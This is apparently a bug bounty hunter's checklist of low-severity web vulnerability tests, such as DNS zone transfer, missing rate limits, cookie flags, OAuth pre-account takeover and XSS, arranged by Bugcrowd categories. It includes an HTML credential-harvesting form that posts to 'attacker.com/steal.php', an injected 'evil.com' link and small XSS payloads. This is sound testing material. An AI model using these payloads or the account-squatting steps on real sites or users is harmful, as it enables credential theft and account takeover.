> ***Server Security Misconfiguration > Misconfigured DNS > Zone Transfer***
- [ ] [DNS-ZONE-TRANSFER-CHECKER](https://pentest-tools.com/network-vulnerability-scanning/dns-zone-transfer-check)

>***Server Security Misconfiguration > Mail Server Misconfiguration > Email Spoofing to Inbox due to Missing or Misconfigured DMARC on Email Domain***
- [ ] [DMARC-Inspector](https://dmarcian.com/dmarc-inspector/)
- [ ] [POC](https://emkei.cz/)

> **Server Security Misconfiguration > Database Management System (DBMS) Misconfiguration > Excessively Privileged User / DBA**
- [ ] [[API5 Broken Function Level Authorization (BFLA)]]

>**Server Security Misconfiguration > Lack of Password Confirmation > Delete Account**

- [ ] Check for any confirmations when deleting password

>**Server Security Misconfiguration > No Rate Limiting on Form**
- [ ] Registration
- [ ] login
- [ ] Email Triggering
- [ ] SMS-Triggering
1. bugcrowd alias h0tak88r+1@bugcrowdninja.com -> Intruder -> [[No-Rate-Limit]] 

>***Server Security Misconfiguration > Missing Secure or HTTPOnly Cookie Flag > Session Token***
- [ ] Check for HTTPOnly Cookie Flag for thr session token and be sure it Really session token

>***Server Security Misconfiguration > Lack of Security Headers > Cache-Control for a Sensitive Page***
- [ ] Open Sensitive-Response  Page -> No Cache Control or No Expire -> Close Browser -> Send request in burp -> Observe that You can see the same/cached response 

>***Server Security Misconfiguration > Clickjacking > Sensitive Click-Based Action***
- [ ] Click Based Actions

>****Server Security Misconfiguration > OAuth Misconfiguration > Account Squatting | Pre-ATO***
1. Register an account via victim email or Change your account to unsigned-victim email if there is no confirmation from victim side 
2. Don't Confirm the email
3. Victim register with OAUTH and login his account 
4. Attacker use Credentials in Step(1) to login to the account 

>***Server Security Misconfiguration > CAPTCHA > Implementation Vulnerability***
- [ ] [[CAPTCHA Feature]]

>***Server Security Misconfiguration > Web Application Firewall (WAF) Bypass > Direct Server Access***
- [ ] Check for original IP in shodan.io or other Alternatives (ipcriminal,....) and make sure it doesn't implement WAF

>***Server-Side Injection > Content Spoofing***
- [ ] Check  For Impersonation via <span style="color:#06ea6c">Broken Link Hijacking</span> via this [Extension](https://addons.mozilla.org/en-US/firefox/addon/find-broken-links/)
- [ ] Check for <span style="color:#06ea6c">Email HTML Injection</span> -> by Injecting in all Fields -> `<a href="https://evil.com">Click me to Win 100$</a>` -> Email Triggering Action -> Input Field Rendered as HTML content in email

>****Server-Side Injection > Server-Side Template Injection (SSTI) > Basic***
- [ ] Basic SSTI That u couldn't exploit Further [[SSTI]] ->  [[Parameters Reflection Analysis]]

>***Server-Side Injection > Content Spoofing > External Authentication Injection***
- [ ] Try Using HTML Injection to Inject a External Authentication Form to Still Credentials from the user
```html
<form action="https://attacker.com/steal.php" method="POST">
	<label for="username">Username:</label>
	<input type="text" id="username" name="username" required>

	<label for="password">Password:</label>
	<input type="password" id="password" name="password" required>

	<button type="submit">Log In</button>
</form>
```

>***Broken Authentication and Session Management***

- [ ] Failure to Invalidate Session -> On Password Reset and/or Change 
- [ ] Failure to Invalidate Session > On Logout (Client and Server-Side)
	-  In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out 
- [ ] Clear-text Transmission of Session Token
	- there is no `secure` flag for the session token 
	- `curl http://example.com/path/to/resource`
- [ ] Registration over HTTP
- [ ] Login over HTTP/Or any 

>***Sensitive Data Exposure***

- [ ] Pay-Per-Use-Abuse ( API_Keys, Paid Services Tokens,....)
- [ ] EXIF Geo-location Data Not Stripped From Uploaded Images > Manual User Enumeration
- [ ] Token Leakage via Referer > Untrusted 3rd Party
- [ ] Weak Password Reset Implementation > Password Reset Token Sent Over HTTP
- [ ] Sensitive Token in URL > User Facing
- [ ] Via localStorage/sessionStorage > Sensitive Token

>  **XSS**
- [ ] Stored > Privileged User to No Privilege Elevation
- [ ] Universal (UXSS) -> Data URI -> `data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=`
- [ ] Referer XSS -> `Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5`

>  ***Broken Access Control (BAC) > Server-Side Request Forgery (SSRF) > External***
- [ ] Low Impact of SSRF Vuln, the impact of "external SSRF" is believed to be DoS, information disclosure (in the request), and origin IP disclosure

> ***Broken Access Control (BAC) > Username/Email Enumeration > Non-Brute Force***
- [ ] Found [[IDOR]] or [[Authorization-Schema]] that Leaks Usernames/Emails

> ***Unvalidated Redirects and Forwards > Open Redirect > GET-Based***
- [ ] [[Open Redirect]]

> ***Insufficient Security Configurability*** 
- [ ] No Password Policy -> Password:`123`
- [ ] Weak Password Reset Implementation > Token is Not Invalidated After Use
- [ ] Weak 2FA Implementation > 2FA Secret Cannot be Rotated
	Rotating the secret means changing this key periodically to enhance security. If the 2FA secret cannot be rotated, it means that once the secret is compromised, an attacker could potentially gain ongoing access to the account without the user’s knowledge, as there is no way for the user to change the secret.
- [ ] Weak 2FA Implementation > 2FA Secret Remains Obtainable After 2FA is Enabled
	Look for Leaked 2FA Secret after acticvating 2FA
